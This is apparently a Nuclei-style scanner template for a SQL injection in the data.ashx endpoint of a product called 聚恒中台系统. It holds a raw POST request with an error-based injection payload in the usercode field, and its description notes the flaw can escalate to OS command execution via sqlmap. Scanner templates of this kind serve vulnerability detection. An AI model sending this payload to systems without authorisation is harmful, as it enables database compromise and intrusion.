http:
    - matchers:
        - part: body
          type: word
          words:
            - 转换成数据类型 int 时失败
        - status:
            - 200
          type: status
      matchers-condition: and
      raw:
        - |
          POST /sysplat/dataget/data.ashx?type=sendvalidatecode HTTP/1.1
          Host: {{Hostname}}
          Content-Type: application/x-www-form-urlencoded; charset=UTF-8
          Connection: close

          usercode=1' and 1=(convert(int,@@version))--&&mobile=
id: hengjuzhongtai-data-sql
info:
    author: Superhero
    description: 聚恒中台系统 data.ashx存在SQL注入致RCE漏洞复现(sqlmap -os-shell)
    name: 聚恒中台系统 data.ashx SQL注入
    severity: high
    tags: []
